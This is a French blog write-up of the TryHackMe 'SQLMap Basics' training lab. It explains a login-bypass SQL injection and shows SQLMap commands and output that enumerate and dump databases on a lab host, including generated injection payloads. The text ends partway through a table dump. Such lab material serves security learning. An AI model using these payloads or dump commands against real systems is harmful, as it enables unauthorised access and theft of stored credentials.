---
title: "TryHackMe - SQLMap Basics"
date: 2025-10-25 13:51:00 +0200
categories: [TryHackMe, Learning]
tags: [SQL, SQLMap, injection]
description: "Write-up de la room SQLMap Basics qui nous apprendra plus en profondeur les faille d'SQL injection et comment les exploiter avec l'outil SQLMap"
image:
  path: /assets/img/posts/tryhackme-hydra.png
  alt: "SQLMap"
---

## Informations sur la room

Découvrez l'injection SQL et exploitez cette vulnérabilité via l'outil SQLMap.

**Lien :** [SQLMap Basics](https://tryhackme.com/room/sqlmapthebasics)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Vulnérabilité d'injection SQL
- Chasse à l'injection SQL via l'outil SQLMap

---

## Solutions des tâches

### Task 1 - Introduction

L'**injection SQL** est une vulnérabilité répandue et constitue depuis longtemps un sujet brûlant en matière de cybersécurité. Pour comprendre cette vulnérabilité, nous devons d’abord apprendre ce qu’est une base de données et comment les sites Web interagissent avec une base de données.

Une base de données est un ensemble de données qui peuvent être stockées, modifiées et récupérées. Il stocke les données de plusieurs applications dans un `format structuré`, ce qui rend le stockage, la modification et la récupération faciles et efficaces. Vous interagissez quotidiennement avec plusieurs sites Web. Le site Web contient certaines des pages Web sur lesquelles la saisie de l'utilisateur est requise. 

Par exemple, un site Web avec une page de connexion vous demande de **saisir vos informations d'identification**, et une fois que vous les avez saisies, il vérifie si les informations d'identification sont correctes et vous connecte si elles le sont. Étant donné que de nombreux utilisateurs se connectent à ce site Web, comment ce site Web enregistre-t-il toutes les données de ces utilisateurs et les vérifie-t-il pendant le processus d'authentification ? Tout cela se fait à l'aide d'une base de données. Ces sites Web disposent de bases de données qui **stockent l’utilisateur** et d’autres informations et les récupèrent en cas de besoin. Ainsi, lorsque vous saisissez vos informations d’identification sur la page de connexion d’un site Web, le **site Web interagit avec sa base de données** pour vérifier si ces informations d’identification sont correctes. De même, si vous disposez d'un champ de saisie pour rechercher quelque chose, par exemple, un champ de saisie d'un site Web de librairie vous permet de rechercher les livres disponibles à la vente. Lorsque vous recherchez un livre, le site Web interagira avec la base de données pour récupérer l'enregistrement de ce livre et l'afficher sur le site Web.

Désormais, nous savons que le site Web demande à la base de données de récupérer, stocker ou modifier n'importe quelle donnée. Alors, comment se déroule cette interaction ? Les bases de données sont gérées par des systèmes de gestion de bases de données (`SGBD`), tels que `MySQL`, `PostgreSQL`, `SQLite` ou `Microsoft SQL Server`. Ces systèmes comprennent le langage de requête structuré (SQL). Ainsi, toute application ou site Web utilise des requêtes SQL lors de l’interaction avec la base de données.

---

**Which language builds the interaction between a website and its database?**

**Réponse :** `SQL`

### Task 2 - SQL Injection Vulnerability

Dans la tâche précédente, nous avons étudié comment les sites Web et les applications interagissent avec les bases de données pour `stocker, modifier et récupérer` leurs données **de manière structurée**. Dans cette tâche, nous verrons comment l'interaction entre `une application et une base de données` se produit via des **requêtes SQL** et comment les attaquants peuvent exploiter ces requêtes SQL pour effectuer des attaques par **injection SQL**.

> Avant de continuer, assurez-vous d'essayer les méthodes d'injection SQL manuelles ou automatisées uniquement après l'autorisation du propriétaire de l'application.
{: .prompt-warning}

- username : `John`
- password : `Un@detectable444`

Une fois que vous avez entré votre nom d'utilisateur et votre mot de passe, le site Web les recevra, effectuera une requête SQL avec vos informations d'identification et l'enverra à la base de données.

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

Supposons que la page de connexion au site Web dont nous avons discuté ci-dessus manque de validation et de désinfection des entrées. Cela signifie qu'il est **vulnérable à l'injection SQL**. L'attaquant ne connaît pas le mot de passe de l'utilisateur John. Ils saisiront la saisie suivante dans les champs indiqués :

- username : `John`
- password : `abc' OR 1=1;-- -`

Cette fois, l'attaquant a tapé une chaîne aléatoire abc et une chaîne injectée `' OR 1=1;-- -`. La requête SQL que le site enverrait à la base de données deviendra désormais la suivante :

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

Cette instruction ressemble à la requête SQL précédente mais ajoute désormais une autre condition avec l'opérateur `OR`. Cette requête verra s'il y a un utilisateur, `John`. Ensuite, il vérifiera si John possède le mot de passe abc (qu'il ne pouvait pas avoir car l'attaquant a saisi un mot de passe aléatoire). Idéalement, la requête devrait échouer ici car elle s'attend à ce que le nom d'utilisateur et le mot de passe soient corrects, car il existe un opérateur AND entre eux. 

Mais cette requête a une autre condition, `OR`, entre le mot de passe et une instruction `1=1`. Si l’un d’entre eux est vrai, **l’ensemble de la requête SQL réussira**. Le mot de passe a échoué, la requête vérifiera donc la condition suivante, qui vérifie si `1=1`. Comme nous le savons, 1=1 est `toujours vrai`, il ignorera donc le mot de passe aléatoire saisi auparavant et considérera cette instruction comme vraie, ce qui exécutera avec succès cette requête. Le `-- -` à la fin de **la requête commenterait n'importe quoi après 1=1**, ce qui signifie que la requête serait exécutée avec succès et que **l'attaquant serait connecté** au compte utilisateur de John.

L'une des choses importantes à noter ici est l'utilisation d'un guillemet simple `'` après abc. Sans ce guillemet simple, la chaîne entière « `abc OR 1=1;-- -` » serait considérée comme le mot de passe, ce qui n'est pas prévu. Cependant, si nous ajoutons un guillemet simple `'` après abc, le mot de passe ressemblerait à `'abc' OR 1=1;---'`, qui enferme la chaîne d'origine abc dans la requête et nous permet d'introduire une condition logique `OR 1=1`, qui est toujours vraie.

![SQLMap](https://tryhackme-images.s3.amazonaws.com/user-uploads/6645aa8c024f7893371eb7ac/room-content/6645aa8c024f7893371eb7ac-1727955724338.png)

---

**Which boolean operator checks if at least one side of the operator is true for the condition to be true?**

**Réponse :** `OR`

**Is 1=1 in an SQL query always true? (YEA/NAY)**

**Réponse :** `Yea`

### Task 3 - Automated SQL Injection Tool

Réaliser une attaque par injection SQL implique de découvrir la vulnérabilité d'injection SQL à l'intérieur de l'application et de manipuler la base de données. Cependant, faire tout cela manuellement **peut prendre du temps et des efforts**.

> Avant d'aller de l'avant, il est essentiel de noter que les commandes expliquées dans cette tâche ne fonctionneraient pas dans l'AttackBox puisqu'il s'agit d'une URL supposée vulnérable à titre d'**explication uniquement**. Cependant, la tâche suivante vous donnera un aperçu pratique via une URL vulnérable pour mener à bien cette attaque.
{: .prompt-info}

`SQLMap` est un outil **automatisé** permettant de **détecter et d'exploiter** les vulnérabilités d'injection SQL dans les applications Web. Cela simplifie le processus d’identification de ces vulnérabilités. Cet outil est intégré à certaines distributions Linux, mais vous pouvez facilement l'installer si ce n'est pas le cas.

Comme il s'agit d'un outil de ligne de commande, vous devez ouvrir votre terminal Linux OS pour l'utiliser. La commande `--help` ou `-h` avec **SQLMap** listera tous les indicateurs disponibles que vous pouvez utiliser. Si vous ne souhaitez pas ajouter manuellement les indicateurs à chaque commande, utilisez l'indicateur `--wizard` avec SQLMap. Lorsque vous utilisez ce drapeau, l'`outil vous guidera` à travers chaque étape et vous posera des questions pour terminer l'analyse, ce qui en fait une option parfaite pour les débutants.

Voici le `--help` de SQLMap :

```bash
root@ip-10-10-90-184:~# sqlmap --help
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users
[13:53:54] [WARNING] you haven't updated sqlmap for more than 2031 days!!!
```

On peut y voir beaucoup de choses, notemment qu'ils n'ont pas fait les mises a jours de depuis 2031 jours ! 

Le flag `--dbs` vous aide à extraire tous les noms de bases de données. Une fois que vous connaissez les noms des bases de données, vous pouvez extraire des informations sur les tables de cette base de données en utilisant `-D nom_base_de_données --tables`. Après avoir obtenu les tables, si vous souhaitez énumérer les enregistrements dans ces tables, vous pouvez utiliser `-D nom_base_de_données -T nom_table --dump` 

```bash
root@ip-10-10-90-184:~# sqlmap --wizard
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:59:20 /2025-10-25/

[13:59:20] [INFO] starting wizard interface
Please enter full target URL (-u):
```

Et si on donne un exemple a SQLMap comme par exemple une url cible qui se termine par `?cat=1` il va comprendre qu'il faut qu'il teste plein de choses voir si c'est possible de faire quelque chose avec ça comme ceci:

```bash
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
      __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] heuristics detected web page charset 'ascii'
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:49] [INFO] testing if the target URL content is stable
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[text removed]
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[text removed]
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[text removed]
```

On voit qu'il a testé plein d'injection SQL ci dessus

Pour récupérer les bases de données, nous utilisons le flag `--dbs`. Essayons ce flag avec notre URL vulnérable :

```bash
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:49:00] [INFO] resuming back-end DBMS' mysql' 
[08:49:00] [INFO] testing connection to the target URL
[08:49:01] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]    
[08:49:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members

[text removed]
```

Après avoir exécuté la commande ci-dessus, nous avons obtenu deux noms de base de données. Sélectionnez la base de données des `users` et récupérez les tables qu'elle contient. Nous définirons la base de données après l'indicateur `-D` et utiliserons le flag `--tables` à la fin pour extraire tous les noms de tables.

```bash
           
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:50:46] [INFO] resuming back-end DBMS' mysql' 
[08:50:46] [INFO] testing connection to the target URL
[08:50:46] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:50:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:50:46] [INFO] fetching tables for database: 'users'
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |     
+-----------+

[text removed]
```

Maintenant que nous avons tous les noms de tables disponibles de la base de données, vidons les enregistrements présents dans la table `Thomas`. Pour ce faire, nous définirons la base de données avec l'option `-D`, la table avec l'option `-T`, et pour **extraire les enregistrements de la table**, nous utiliserons l'option `--dump`.

```bash
           
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:51:48] [INFO] resuming back-end DBMS' mysql' 
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+

[text removed]
```

Cependant, contrairement à l'URL utilisée pour les tests ci-dessus, vous pouvez également utiliser des tests basés sur `POST`, dans lesquels l'application envoie des données **dans le corps de la requête au lieu de l'URL**. Des exemples pourraient être des **formulaires de connexion**, des **formulaires d'inscription**, etc. Pour suivre cette approche, vous devez intercepter une requête `POST` sur la page de **connexion ou d'inscription** et **l'enregistrer sous forme de fichier texte**. Vous pouvez utiliser la commande suivante pour saisir cette requête enregistrée dans le fichier texte dans l'outil SQLMap :

```bash
user@ubuntu:~$ sqlmap -r intercepted_request.txt
```

> Apprendre à intercepter et capturer les requêtes **POST** est hors de portée de cette salle.
{: .prompt-info}

---

**Which flag in the SQLMap tool is used to extract all the databases available?**

**Réponse :** `--dbs`

**What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)**

**Réponse :** `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`

### Task 4 - Practical Exercise

L'application Web dispose d'une page de connexion hébergée à l'adresse `http://10.10.111.207/ai/login`. Lorsque vous visitez cette URL, vous verrez une page de connexion vulnérable à l’injection SQL.

![SQLMap Site](https://tryhackme-images.s3.amazonaws.com/user-uploads/6645aa8c024f7893371eb7ac/room-content/6645aa8c024f7893371eb7ac-1728644371711.png)

Dans la tâche précédente, nous avons vu que si nous voyons des paramètres `GET` dans l'URL, ils pourraient être vulnérables à l'injection SQL, et nous pouvons copier cette URL pour l'utiliser avec SQLMap. Nous avons également vu que s'il y a une requête `POST` et que les données sont envoyées dans le corps plutôt que dans l'URL, nous pouvons intercepter la requête et l'utiliser avec l'outil SQLMap pour exploiter une vulnérabilité d'injection SQL, le cas échéant.

Ainsi, pour obtenir l'**URL complète** ainsi que ses paramètres `GET`, nous devons cliquer avec le bouton droit sur la page de connexion et cliquer sur l'option d'`inspection` (le processus peut varier légèrement d'un navigateur à l'autre). À partir de là, nous devons sélectionner l'onglet `Réseau`

Nous devons ensuite saisir quelques informations d'identification **de test** dans les champs du nom d'utilisateur et du mot de passe et cliquer sur le bouton de connexion, et nous pourrons voir la demande `GET`. Cliquez sur cette requête et nous pouvons voir la requête GET complète avec les paramètres. Nous pouvons copier cette URL complète et l'utiliser avec l'outil SQLMap pour découvrir les vulnérabilités d'injection SQL à l'intérieur et l'exploiter. La demande complète est présentée dans la capture d'écran ci-dessous :

![SQLMap site 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/6645aa8c024f7893371eb7ac/room-content/6645aa8c024f7893371eb7ac-1728644607260.png)

La voici : `http://10.10.111.207/ai/includes/user_login?email=test&password=test`

Exécutez les commandes comme indiqué dans la tâche précédente sur cette URL et répondez aux questions posées dans cette tâche. N'oubliez pas non plus d'inclure votre URL entre guillemets simples `'`. Ceci permet d'éviter les erreurs avec les caractères spéciaux dans le terminal tels que `?`.

> Il se peut que vous n'obteniez pas les résultats par une simple analyse ; ajoutez `--level=5` à la fin de vos commandes pour effectuer les **analyses approfondies**. Deuxièmement, lors de l'exécution des commandes, l'outil peut vous poser quelques questions; assurez-vous d'y répondre comme suit pour exécuter l'analyse en douceur
{: .prompt-tip}

- Il semble que le SGBD back-end soit « MySQL ». Souhaitez-vous ignorer les payloads de test spécifiques à d’autres SGBD ? [O/n] : oui
- Pour les tests restants, souhaitez-vous inclure tous les tests pour l'extension de la valeur de risque (1) fournie par « MySQL » ? [O/n] : oui
- Injection non exploitable avec des valeurs NULL. Voulez-vous essayer avec une valeur entière aléatoire pour l'option '--union-char' ? [O/n] : oui
- Le paramètre `GET 'email'` est vulnérable. Voulez-vous continuer à tester les autres (le cas échéant) ? [o/N] : n

---

**How many databases are available in this web application?**

Alors pour commencer j'ai fais la commande avec `--wizard` ce qui m'a permis d'identifier des failles :

```bash
root@ip-10-10-90-184:~# sqlmap --wizard
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:28:54 /2025-10-25/

[14:28:54] [INFO] starting wizard interface
Please enter full target URL (-u): http://10.10.111.207/ai/includes/user_login?email=test&password=my_password
POST data (--data) [Enter for None]: 
Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
> 3
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Intermediate
[3] All
> 1

sqlmap is running, please wait..

sqlmap identified the following injection point(s) with a total of 1107 HTTP(s) requests:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test' AND 9749=(SELECT (CASE WHEN (9749=9749) THEN 9749 ELSE (SELECT 8209 UNION SELECT 3577) END))-- irFf&password=my_password

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test' OR (SELECT 2937 FROM(SELECT COUNT(*),CONCAT(0x717a786a71,(SELECT (ELT(2937=2937,1))),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jUhZ&password=my_password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 3712 FROM (SELECT(SLEEP(5)))BwqO)-- usqD&password=my_password
---
[14:30:09] [INFO] retrieved: '10.4.24-MariaDB'
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
banner: '10.4.24-MariaDB'
[14:30:10] [INFO] retrieved: 'root@localhost'
current user: 'root@localhost'
[14:30:10] [INFO] retrieved: 'ai'
current database: 'ai'
current user is DBA: True

[*] ending @ 14:30:10 /2025-10-25/
```

Et ensuite j'ai simplement utilisé ces failles pour voir la base de donnée avec le `--dbs` et le `--level=5` qu'on nous avait dit de mettre.

```bash
root@ip-10-10-90-184:~# sqlmap -u "http://10.10.111.207/ai/includes/user_login?email=test&password=my_password"   --level=5 --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:38:32 /2025-10-25/

[14:38:32] [INFO] resuming back-end DBMS 'mysql' 
[14:38:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test' AND 9749=(SELECT (CASE WHEN (9749=9749) THEN 9749 ELSE (SELECT 8209 UNION SELECT 3577) END))-- irFf&password=my_password

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test' OR (SELECT 2937 FROM(SELECT COUNT(*),CONCAT(0x717a786a71,(SELECT (ELT(2937=2937,1))),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jUhZ&password=my_password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 3712 FROM (SELECT(SLEEP(5)))BwqO)-- usqD&password=my_password
---
[14:38:32] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:38:32] [INFO] fetching database names
[14:38:32] [INFO] resumed: 'information_schema'
[14:38:32] [INFO] resumed: 'ai'
[14:38:32] [INFO] resumed: 'mysql'
[14:38:32] [INFO] resumed: 'performance_schema'
[14:38:32] [INFO] resumed: 'phpmyadmin'
[14:38:32] [INFO] resumed: 'test'
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[14:38:32] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.111.207'
[14:38:32] [WARNING] you haven't updated sqlmap for more than 2031 days!!!

[*] ending @ 14:38:32 /2025-10-25/
```

Et comme on peut le voir, on apperçois plusieurs bases de données comme `ai`, `information_schema`...

**Réponse :** `6`

**What is the name of the table available in the "ai" database?**

Donc je me souviens que pour dire a SQLMap qu'on va chercher des infos dans une certaine tables, on utilise le flag `-D` suivi du nom de la table et en n'oubliant pas le flag `--tables` pour afficher celles ci

```bash
root@ip-10-10-90-184:~# sqlmap -u "http://10.10.111.207/ai/includes/user_login?email=test&password=my_password" -D ai --tables --level=5
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:55:46 /2025-10-25/

[14:55:46] [INFO] resuming back-end DBMS 'mysql' 
[14:55:46] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test' AND 9749=(SELECT (CASE WHEN (9749=9749) THEN 9749 ELSE (SELECT 8209 UNION SELECT 3577) END))-- irFf&password=my_password

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test' OR (SELECT 2937 FROM(SELECT COUNT(*),CONCAT(0x717a786a71,(SELECT (ELT(2937=2937,1))),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jUhZ&password=my_password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 3712 FROM (SELECT(SLEEP(5)))BwqO)-- usqD&password=my_password
---
[14:55:46] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:55:46] [INFO] fetching tables for database: 'ai'
[14:55:47] [INFO] retrieved: 'user'
Database: ai
[1 table]
+------+
| user |
+------+

[14:55:47] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.111.207'
[14:55:47] [WARNING] you haven't updated sqlmap for more than 2031 days!!!

[*] ending @ 14:55:47 /2025-10-25/
```

**Réponse :** `user`

**What is the password of the email test@chatai.com?**

Pour le trouver on a besoin de préciser a SQLMap d'utiliser le `user` qu'on a trouvé juste avant comme ceci : `-D ai -T user --dump` et en oubliant pas le `--level=5` comme demandé.

```bash
root@ip-10-10-90-184:~# sqlmap -u "http://10.10.111.207/ai/includes/user_login?email=test&password=my_password" -D ai -T user --dump --level=5
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:02:16 /2025-10-25/

[15:02:16] [INFO] resuming back-end DBMS 'mysql' 
[15:02:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test' AND 9749=(SELECT (CASE WHEN (9749=9749) THEN 9749 ELSE (SELECT 8209 UNION SELECT 3577) END))-- irFf&password=my_password

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test' OR (SELECT 2937 FROM(SELECT COUNT(*),CONCAT(0x717a786a71,(SELECT (ELT(2937=2937,1))),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jUhZ&password=my_password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 3712 FROM (SELECT(SLEEP(5)))BwqO)-- usqD&password=my_password
---
[15:02:16] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[15:02:16] [INFO] fetching columns for table 'user' in database 'ai'
[15:02:16] [INFO] retrieved: 'id'
[15:02:16] [INFO] retrieved: 'int(11)'
[15:02:16] [INFO] retrieved: 'email'
[15:02:16] [INFO] retrieved: 'varchar(512)'
[15:02:16] [INFO] retrieved: 'password'
[15:02:16] [INFO] retrieved: 'varchar(512)'
[15:02:16] [INFO] retrieved: 'created'
[15:02:16] [INFO] retrieved: 'timestamp'
[15:02:16] [INFO] fetching entries for table 'user' in database 'ai'
[15:02:16] [INFO] retrieved: '1'
[15:02:16] [INFO] retrieved: '12345678'
[15:02:16] [INFO] retrieved: '2023-02-21 09:05:46'
[15:02:17] [INFO] retrieved: 'test@chatai.com'
Database: ai
Table: user
